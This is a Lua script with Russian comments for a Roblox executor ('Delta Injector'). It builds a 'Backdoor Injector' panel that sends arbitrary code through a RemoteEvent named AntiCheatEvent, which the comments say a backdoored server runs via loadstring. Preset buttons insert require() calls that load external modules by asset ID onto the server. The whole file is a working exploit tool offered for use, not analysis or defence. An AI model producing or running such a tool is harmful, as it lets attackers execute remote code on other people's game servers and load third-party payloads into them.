-- Lua скрипт для Delta Injector: панель с полем ввода и кнопкой инжекта через AntiCheatEvent
-- Предполагается, что в ReplicatedStorage есть RemoteEvent с именем "AntiCheatEvent"
-- (если имя другое – замени в строке поиска)

local player = game:GetService("Players").LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")

-- Поиск события (можно заменить на конкретный путь)
local antiCheatEvent = replicatedStorage:FindFirstChild("AntiCheatEvent")
if not antiCheatEvent then
-- Если не найден, создаём заглушку (на реальном бэкдоре он есть)
antiCheatEvent = Instance.new("RemoteEvent")
antiCheatEvent.Name = "AntiCheatEvent"
antiCheatEvent.Parent = replicatedStorage
end

local gui = Instance.new("ScreenGui")
gui.Name = "AntiCheatExecutor"
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 200)
frame.Position = UDim2.new(0.5, -200, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Active = true
frame.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Text = "Backdoor Injector (AntiCheatEvent)"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.Parent = frame

local codeBox = Instance.new("TextBox")
codeBox.Size = UDim2.new(0, 350, 0, 50)
codeBox.Position = UDim2.new(0.5, -175, 0, 60)
codeBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
codeBox.TextColor3 = Color3.fromRGB(200, 200, 200)
codeBox.PlaceholderText = [[require(17182254638)("Noob_P4oS")]]
codeBox.TextScaled = true
codeBox.Font = Enum.Font.SourceSans
codeBox.ClearTextOnFocus = false
codeBox.Parent = frame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0, 300, 0, 25)
statusLabel.Position = UDim2.new(0.5, -150, 0, 120)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Ready"
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
statusLabel.TextScaled = true
statusLabel.Font = Enum.Font.SourceSans
statusLabel.Parent = frame

local injectButton = Instance.new("TextButton")
injectButton.Size = UDim2.new(0, 150, 0, 35)
injectButton.Position = UDim2.new(0.5, -75, 0, 155)
injectButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
injectButton.Text = "Inject"
injectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
injectButton.Font = Enum.Font.SourceSansBold
injectButton.Parent = frame

-- Обработчик кнопки – отправляет код через AntiCheatEvent
injectButton.MouseButton1Click:Connect(function()
local code = codeBox.Text
if code and code ~= "" then
statusLabel.Text = "Injecting..."
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
-- Отправляем код как строку через RemoteEvent (на сервере выполняется loadstring)
antiCheatEvent:FireServer(code)
-- Ждём ответа (можно добавить проверку через событие, но упрощённо)
wait(0.5)
statusLabel.Text = "Injected"
statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
else
statusLabel.Text = "No code entered"
statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
end
end)

-- Также можно добавить кнопки быстрой вставки (опционально)
local presetButton1 = Instance.new("TextButton")
presetButton1.Size = UDim2.new(0, 170, 0, 25)
presetButton1.Position = UDim2.new(0, 10, 0, 60)
presetButton1.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
presetButton1.Text = [[require(17182254638)("Noob_P4oS")]]
presetButton1.TextColor3 = Color3.fromRGB(255, 255, 255)
presetButton1.TextScaled = true
presetButton1.Font = Enum.Font.SourceSans
presetButton1.Parent = frame

local presetButton2 = Instance.new("TextButton")
presetButton2.Size = UDim2.new(0, 170, 0, 25)
presetButton2.Position = UDim2.new(0, 10, 0, 90)
presetButton2.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
presetButton2.Text = [[require(7192763922).load("Xiao_Toi")]]
presetButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
presetButton2.TextScaled = true
presetButton2.Font = Enum.Font.SourceSans
presetButton2.Parent = frame

presetButton1.MouseButton1Click:Connect(function()
codeBox.Text = [[require(17182254638)("Noob_P4oS")]]
end)

presetButton2.MouseButton1Click:Connect(function()
codeBox.Text = [[require(7192763922).load("Xiao_Toi")]]
end)
